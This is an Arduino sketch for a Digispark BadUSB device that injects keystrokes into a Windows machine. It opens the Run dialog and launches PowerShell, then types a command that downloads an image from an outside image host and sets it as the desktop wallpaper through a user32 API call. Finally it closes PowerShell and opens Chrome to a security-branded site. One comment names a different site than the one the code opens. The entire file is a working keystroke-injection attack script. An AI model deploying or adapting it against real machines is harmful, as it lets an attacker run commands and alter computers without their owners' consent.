#include "DigiKeyboard.h"

void setup() {
  delay(3000);
  DigiKeyboard.sendKeyStroke(0); // wake up

  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Win + R
  DigiKeyboard.delay(500);

  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);

  // Your corrected PowerShell command

  DigiKeyboard.print("$p=$env:TEMP+'\\\\bg.jpg';iwr 'https://i.ibb.co/BKYLQvHN/saidsecurity-wallppr.jpg' -OutFile $p;$s='[DllImport(\"user32.dll\")]public static extern int SystemParametersInfo(int uAction,int uParam,string lpvParam,int fuWinIni);';Add-Type -MemberDefinition $s -Name a -Namespace b;[b.a]::SystemParametersInfo(20,0,$p,3)");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(8000);
  // Give enough time for download and wallpaper update
  // 8seconds (adjust if needed)

  // Close PowerShell window
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT); 
  DigiKeyboard.delay(1000);

  // Open cyberdark.org in Chrome
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Win + R
  DigiKeyboard.delay(500);

  DigiKeyboard.print("chrome https://saidsecurity.com");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(1000);
}

void loop() {
  // nothing here
}

